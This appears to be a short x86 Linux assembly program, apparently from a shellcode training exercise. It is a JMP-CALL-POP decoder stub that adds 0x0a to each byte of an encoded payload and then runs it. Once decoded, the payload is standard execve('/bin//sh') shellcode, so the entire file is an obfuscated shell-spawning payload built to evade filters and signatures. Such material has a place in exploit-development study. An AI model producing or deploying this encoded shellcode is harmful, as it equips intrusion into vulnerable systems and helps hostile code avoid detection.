global _start
section .text
_start:
jmp short call_shellcode
decoder:
 ; mov shellcode into esi
 pop esi
decode:
 add byte [esi], 0x0a
 inc esi
 cmp byte [esi], 0x0a
 je EncodedShellcode
 jmp short decode
call_shellcode:
 call decoder
 EncodedShellcode: db 0x27,0xb6,0x46,0x5e,0x64,0x25,0x69,0x5e,0x5e,0x25,0x25,0x58,0x5f,0x7f,0xd9,0x46,0x7f,0xd8,0x49,0x7f,0xd7,0xa6,0x01,0xc3,0x76,0x0a
